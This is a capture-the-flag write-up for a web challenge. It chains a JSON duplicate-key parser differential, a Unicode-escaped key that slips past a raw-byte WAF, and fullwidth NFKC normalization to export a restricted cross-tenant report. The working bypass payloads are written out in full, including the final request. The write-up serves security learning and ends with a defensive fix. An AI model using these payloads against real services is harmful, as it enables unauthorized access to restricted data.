+++
title = "Canon Collapse | IEEE VICTORIS CTF 2026 Qualifications"
date = "2026-09-18"
tags = ["CTF", "Web", "WAF-Bypass", "JSON-Parser-Differential", "Unicode-Normalization", "Medium"]
description = "Chaining a JSON parser differential, an escaped duplicate key to smuggle past the WAF, and a fullwidth NFKC normalization gap to export prime/audit-final as demo."
draft = false
+++

Hey Everyone, this one's the wildest web challenge I tackled at **IEEE VICTORIS CTF 26 Qualifications**, and I got the **first blood** on it. Only 2 solves across the whole competition. The entire kill chain boils down to one idea: make every layer of the backend see a different version of the same bytes. Let's goooo

This one was built as an **anti-AI** challenge, so it threw human verification at us constantly, a gate with a real CAPTCHA that had to be solved by hand every few minutes. Once past it, the Canon Export Console lives at `https://165.227.130.95:65123/`. We start as a **demo** tenant viewer, and our target is a **restricted** compliance report, `prime/audit-final` — one we are definitely not supposed to read.

**The intended chain is:**

1. Pass the `/gate/` checkpoint.
2. Learn the report model from `/docs/`, including the `=public/monthly` canonical path contradiction.
3. Discover the WAF reads raw bytes and ignores escaped keys.
4. Smuggle our secret under the escaped `\u0072eport` key.
5. Fat-letter the `prime/audit-final` path so the Policy doesn't recognize it, while the Archive Resolver NFKC-normalizes it back to the real restricted path.
6. Download the job and grab the flag.

# The Checkpoint Gate

Opening the URL redirects to `/gate/`. The page has a 6-character image CAPTCHA:

<img width="947" height="767" alt="image" src="https://github.com/user-attachments/assets/5c514244-ef91-4347-bf9a-7efabcbdae6b" />


Successful verification returns our session. Once checkpoint, the session carries the grant automatically for every route after.

# Console Discovery

The console is a client-side React app. Reading its source reveals the real API surface:

```text
GET  /api/reports
POST /api/v1/export
```

And here is the critical part, the console sends the export request like this:

```javascript
fetch('/api/v1/export', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json', 'X-Auth': token },
  body: bodyString
})
```

**What does this mean?**

The browser does **not** parse or canonicalize the body before sending. Whatever text we put in `bodyString` goes to the server byte-for-byte. Duplicate keys, weird escaping, Unicode nonsense, all of it arrives verbatim. The WAF and the backend each get the exact same raw bytes and have to decide what they mean. On their own. Differently.

The dashboard lists five backend services:

```text
API Gateway | Policy Engine | Capability Service | Report Compiler | Archive Resolver | WAF
```

<img width="1250" height="766" alt="image" src="https://github.com/user-attachments/assets/74eec117-417f-4ead-abf3-16476a64a897" />


Multiple parsers, one input. This is going to be a parser-differential game.

After going to console, you will see that you need another human verification:
<img width="807" height="762" alt="Screenshot 2026-09-19 015125" src="https://github.com/user-attachments/assets/fb2d32e9-74a6-4b24-90ec-465e12714d13" />


then sending a request to see the response:
<img width="907" height="561" alt="image" src="https://github.com/user-attachments/assets/7f14329d-a0a0-455c-8555-a689ffa1287e" />


# Exploring the Docs

The console exposes `/docs/files/`. The useful ones:

```text
overview.md    -> you are demo tenant, viewer role, public exports only
reports.md     -> restricted report = prime/audit-final
exporting.md   -> the export API and canonical paths
```
<img width="1028" height="352" alt="image" src="https://github.com/user-attachments/assets/61ba91a8-1d03-4050-bf5c-bb81871c49c8" />


`reports.md` tells us exactly what to steal and why the normal request fails:
<img width="1291" height="545" alt="image" src="https://github.com/user-attachments/assets/5f962368-276a-40aa-ab14-f424363d246e" />


> Restricted reports belong to privileged tenants and roles and are not listed for standard accounts. The compliance export `prime/audit-final`, for example, is restricted.

Also, `/api/reports` lists five reports but only 3 are public:

```json
{"reports":["board-notes","inventory","monthly","press-kit","sales"]}
```

`board-notes` and `press-kit` are **drafts**. If you export them they literally say:

```text
Board-Notes (INTERNAL DRAFT)
Visibility: public (draft)
Release authorization (draft, non-binding): IEEE{F21B-BF7D-E8EE-1972}
```

Both flags are labeled `draft` and `non-binding`. **They are fake flags btw**, let's continue.

Now `exporting.md` gives the normal flow:
<img width="1287" height="585" alt="image" src="https://github.com/user-attachments/assets/87baa4eb-aa95-4744-befe-f8bf7464baba" />

```json
{"tenant":"demo","report":"monthly","scope":"public"}
-> {"job_id":"job_xxx","ok":true}
-> GET /api/v1/export/job_xxx  -> "Monthly Activity Report..."
```

Plus canonical paths:

```json
{ "tenant": "demo", "report": "monthly",         "scope": "public" }
{ "tenant": "demo", "report": "=public/monthly", "scope": "public" }
```

> These two requests resolve to the same report. Canonical paths take the form `=<tenant>/<report>`.

**This is the hint.**

- The doc says the path form is `=<tenant>/<report>`.
- But the example is `=public/monthly` with an outer `tenant` of `demo`.
- `public` is not a tenant. It's a visibility scope.

**What does this mean?**

The value inside `=...` is NOT derived from the `tenant` field. They are read by different parts of the system:

- The **Policy** reads `tenant`, `report`, `scope` and asks: "is `demo` + `public` allowed?" -> Yes.
- The **Archive Resolver** reads only the `=...` address and asks: "does this file exist?" -> fetches `public/monthly`.

Nobody reconciles them. So the seed of the attack is: tell the Policy what it wants to hear (`demo/public`) and give the Resolver a completely different address (`=prime/audit-final`). Cross-tenant read.

Now let's actually try to give the Resolver the secret.

# Mapping the WAF

Direct restricted request:

```json
{"tenant":"prime","report":"audit-final","scope":"restricted"}
-> {"ok":false,"stage":"waf","code":"WAF_BLOCKED"}
```

<img width="910" height="538" alt="image" src="https://github.com/user-attachments/assets/06069ae3-1d9b-42b1-ac48-312349fe0e58" />


So we start probing what the WAF does and does not block:

```text
prime, PRIME, primex, audit-final, restricted   -> WAF_BLOCKED (substring + case-insensitive)
pr\u0069me, audit-f\u0069nal, prime\u002f...     -> WAF_BLOCKED (it decodes \u IN VALUES)
```

**What does this mean?**

- The WAF is a blacklist with substring matching, case-insensitive.
- It decodes Unicode escapes in **values** before matching. So encoding the secret *value* is dead.

So every sensitive value is only blocked when it sits in its normal field.

# The Duplicate Key Differential

Now let's test what happens with duplicate keys. Safe value first:

```json
{"tenant":"demo","tenant":"prime","report":"monthly","report":"audit-final","scope":"public","scope":"restricted"}
-> report_not_available
```

Restricted value first:

```json
{"tenant":"prime","tenant":"demo",...}
-> WAF_BLOCKED
```

**What does this mean?**

The WAF effectively reads the **first** occurrence of an exact key. It sees `demo` / `monthly` / `public` and approves.

But downstream detects the duplicates and rejects:

```json
{"report":"monthly","report":"monthly","scope":"public"} -> report_not_available
{"report":"monthly","Report":"monthly","scope":"public"} -> report_not_available
```

So exact duplicates and case-colliding keys are both flagged downstream. Dead end? Not yet.

Then the key test. Escaped key:

```json
{"tenant":"demo","report":"monthly","\u0072eport":"sales","scope":"public"}
-> JOB with SALES !!
```

<img width="940" height="542" alt="image" src="https://github.com/user-attachments/assets/e6f77e74-b447-4270-985f-be54609ae0cb" />


**What does this mean?**

- `\u0072eport` in raw bytes is NOT the exact string `"report"`, so the WAF's raw scan ignores it.
- But any real JSON parser decodes `\u0072` to `r` -> key becomes `report` -> now there are two `report` keys -> **last-wins** -> the value is `sales`. [THIS](https://medium.com/@zabedullahpoyel/intigriti-july-2026-ctf-write-up-exploiting-json-parser-differential-duplicate-key-confusion-to-29b94d6001e4) help here 
- And no duplicate-rejection fires, because the duplicate only exists after decoding, not in the raw text.

This is the JSON parser differential. The same bytes are:

- For the WAF: a weird key it ignores.
- For the parser: literally the key `report`, overwriting the safe value.

Now we can smuggle a second interpretation of `report` past the WAF.

# Policy Knows ASCII. So Hide With Fat Letters.

Put the canonical path in the smuggler:

```json
{"tenant":"demo","report":"monthly","\u0072eport":"=prime/audit-final","scope":"public"}
-> report_not_available
```

WAF passed, but **Policy drew the line**: it recognizes the ASCII canonical path `=prime/audit-final` as restricted and declines it. Traversal and encoding tricks all fail too (`=public/../prime...`, `%2e%2e`, case, spaces, null bytes).

The missing primitive turned out to be **Unicode compatibility normalization**. Full-width letters look like normal letters but have different code points:

```text
normal:   prime
fullwidth: ｐｒｉｍｅ
```

The positive control, with a report we can verify:

```json
{"tenant":"demo","report":"monthly","\u0072eport":"=ｐｕｂｌｉｃ/ｍｏｎｔｈｌｙ","scope":"public"}
-> JOB with the real public "Monthly Activity Report"!
```

**`=ｐｕｂｌｉｃ/ｍｏｎｔｈｌｙ` resolved to `=public/monthly`.**

<img width="1150" height="567" alt="image" src="https://github.com/user-attachments/assets/294c9187-c6a5-4f53-91c7-31114715e108" />


This proves the **Archive Resolver applies NFKC** (fullwidth `ｐｕｂｌｉｃ` -> `public`), while the Policy does not. Two components, two normalization behaviors — exactly the asymmetry we need.

# The Final Payload

```json
{"tenant":"demo","report":"monthly","\u0072eport":"=ｐｒｉｍｅ/ａｕｄｉｔ-ｆｉｎａｌ","scope":"public","format":"pdf"}
```
<img width="1250" height="527" alt="image" src="https://github.com/user-attachments/assets/b9f80025-3b54-44c4-b0a6-7ef5bd62d5ae" />


Those are fullwidth letters: `ｐｒｉｍｅ/ａｕｄｉｔ-ｆｉｎａｌ`, not ASCII `prime/audit-final`. Send this verbatim as the raw JSON body (never let `json.dumps` re-escape it).
Got this technique from [this](https://sechub.in/view/2543814). 

**Why it works:**

| Layer | It does | It sees | Verdict |
|---|---|---|---|
| **WAF** | raw text scan | `"report":"monthly"` safe; `"\u0072eport"` looks like a weird key | pass |
| **Parser/Policy** | real JSON decode | decodes key to `report`, last-wins -> `=ｐｒｉｍｅ/ａｕｄｉｔ-ｆｉｎａｌ` (unknown spelling, not restricted) | allow |
| **Archive Resolver** | NFKC normalize, fetch | `NFKC(fullwidth) == =prime/audit-final` | fetches restricted archive |


**JUST READ IT AND DONE.**

# The Takeaway

This whole challenge is one idea: **the WAF does not speak JSON**. It matches raw bytes with regexes. Every real parser decodes escapes and normalizes Unicode. When a request crosses several parsers verbatim, the same bytes can mean `demo/monthly` to one component and `prime/audit-final` to another. The fix that would kill this entire class is the same everywhere, **parse once and validate on the canonical form** (this is what WAFFLED's HTTP-Normalizer and every "fail on duplicate keys" parser policy are about).

# Resources

- Split-Brain JSON: exploiting duplicate-key (first-wins/last-wins) parser disagreements for privilege escalation — https://medium.com/@pratikdahal777/split-brain-json-exploiting-parser-disagreement-across-validation-boundaries-for-privilege-be3a038d8722
- Intigriti July 2026 CTF "Canonically Yours" — duplicate JSON key confusion to bypass namespace restrictions — https://medium.com/@zabedullahpoyel/intigriti-july-2026-ctf-write-up-exploiting-json-parser-differential-duplicate-key-confusion-to-29b94d6001e4
- WAFFLED: exploiting parsing discrepancies to bypass WAFs (JSON/XML/multipart) — https://arxiv.org/html/2503.10846
- HackTricks - Unicode Normalization (NFKC/NFKD folding fullwidth into ASCII) — https://hacktricks.wiki/en/pentesting-web/unicode-injection/unicode-normalization.html
- Jorge Lajara - WAF Bypassing with Unicode Compatibility — https://jlajara.gitlab.io/posts/waf-bypassing-with-unicode-compatibility/

Happy Hacking :)
